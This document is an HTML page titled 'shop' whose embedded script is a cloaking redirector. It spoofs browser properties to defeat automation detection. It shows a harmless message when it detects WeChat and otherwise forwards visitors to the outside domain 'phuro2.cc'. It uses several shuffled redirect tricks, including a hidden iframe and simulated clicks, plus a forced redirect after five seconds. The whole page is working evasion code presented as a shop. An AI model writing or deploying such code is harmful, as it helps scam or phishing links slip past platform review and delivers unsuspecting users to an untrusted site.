<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>shop</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background-color: #fff;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
        }
        .container {
            width: 100%;
            padding: 0;
            height: 100vh;
        }
        .loading {
            padding: 20px;
            font-size: 16px;
            color: #666;
        }
        .status {
            margin-top: 20px;
            font-size: 14px;
            color: #999;
        }
    </style>
    <script>
        // Enhanced anti-detection measures
        (function() {
            // Overwrite key attributes
            Object.defineProperty(navigator, 'userAgent', {
                get: function() {
                    return 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1';
                },
                configurable: true
            });
            
            // Clear automation features
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
                configurable: true
            });
            
            // Overwrite language properties
            Object.defineProperty(navigator, 'language', {
                get: () => 'zh-CN',
                configurable: true
            });
            
            Object.defineProperty(navigator, 'languages', {
                get: () => ['zh-CN', 'zh'],
                configurable: true
            });
            
            // Remove plugin information
            Object.defineProperty(navigator, 'plugins', {
                get: () => [],
                configurable: true
            });
        })();

        // Enhanced WeChat detection
        function enhancedWeChatCheck() {
            try {
                const checks = [];
                
                // Method 1: UserAgent detection
                checks.push(navigator.userAgent.toLowerCase().includes('micromessenger'));
                
                // Method 2: Global object detection
                checks.push(typeof WeixinJSBridge !== 'undefined');
                checks.push(typeof wx !== 'undefined');
                checks.push(typeof __wxjs_environment !== 'undefined');
                
                // Method 3: Specific API detection
                checks.push(!!navigator.vendor && navigator.vendor.includes('Tencent'));
                
                // Method 4: Behavior feature detection
                checks.push(!!window.WeixinJSBridge);
                
                return checks.some(Boolean);
            } catch (e) {
                return false;
            }
        }

        // Random redirect executor
        function executeRandomRedirect(url) {
            let executed = false;
            let attemptCount = 0;
            
            const methods = [
                { 
                    name: "Direct redirect", 
                    method: () => { 
                        window.location.href = url; 
                    } 
                },
                { 
                    name: "Replace redirect", 
                    method: () => { 
                        window.location.replace(url); 
                    } 
                },
                { 
                    name: "iframe redirect", 
                    method: () => {
                        const iframe = document.createElement('iframe');
                        iframe.style.display = 'none';
                        iframe.style.visibility = 'hidden';
                        iframe.style.position = 'absolute';
                        iframe.style.left = '-9999px';
                        iframe.src = url;
                        document.body.appendChild(iframe);
                    } 
                },
                { 
                    name: "Simulate click", 
                    method: () => {
                        const link = document.createElement('a');
                        link.href = url;
                        link.target = '_blank';
                        link.style.display = 'none';
                        document.body.appendChild(link);
                        
                        // Multiple click methods
                        if (link.click) {
                            link.click();
                        } else if (document.createEvent) {
                            const event = document.createEvent('MouseEvents');
                            event.initEvent('click', true, true);
                            link.dispatchEvent(event);
                        }
                    } 
                },
                { 
                    name: "Form submission", 
                    method: () => {
                        const form = document.createElement('form');
                        form.method = 'GET';
                        form.action = url;
                        form.target = '_blank';
                        form.style.display = 'none';
                        document.body.appendChild(form);
                        form.submit();
                    } 
                }
            ];
            
            // Shuffle execution order
            const shuffledMethods = methods.sort(() => Math.random() - 0.5);
            
            // Update status display
            function updateStatus(methodName) {
                attemptCount++;
                const statusEl = document.getElementById('status');
                if (statusEl) {
                    statusEl.innerHTML = `Attempt redirect method ${attemptCount}: ${methodName}`;
                }
            }
            
            // Execute random redirect
            shuffledMethods.forEach((methodObj, index) => {
                const delay = (index + 1) * 300 + Math.random() * 200; // 300-500ms interval
                
                setTimeout(() => {
                    if (!executed) {
                        try {
                            updateStatus(methodObj.name);
                            methodObj.method();
                            executed = true;
                            console.log(`Redirect successful: ${methodObj.name}`);
                        } catch (error) {
                            console.log(`Redirect failed: ${methodObj.name}`, error);
                        }
                    }
                }, delay);
            });
            
            // Final guarantee: Forced redirect after 5 seconds
            setTimeout(() => {
                if (!executed) {
                    updateStatus("Forced redirect");
                    window.location.href = url;
                }
            }, 5000);
        }

        // Main logic
        (function main() {
            // Random delay before executing main logic
            const delay = Math.random() * 1000 + 500;
            
            setTimeout(() => {
                const queryString = window.location.search;
                const targetUrl = 'https://phuro2.cc';
                const redirectUrl = targetUrl + queryString;

                // Check environment and execute corresponding operation
                if (enhancedWeChatCheck()) {
                    // In WeChat environment: Only show status information
                    document.getElementById('message').innerHTML = `
                        <div class="status">WeChat environment detected</div>
                    `;
                } else {
                    // In non-WeChat environment: Execute random redirect
                    document.getElementById('message').innerHTML = `
                        <div class="loading"></div>
                        <div class="status" id="status">Initializing redirect program...</div>
                    `;
                    
                    // Start redirect after a short delay
                    setTimeout(() => {
                        executeRandomRedirect(redirectUrl);
                    }, 800);
                }
            }, delay);
        })();
    </script>
</head>
<body>
    <div class="container">
        <div id="message">
            <div class="loading">loading...</div>
        </div>
    </div>
</body>
</html>
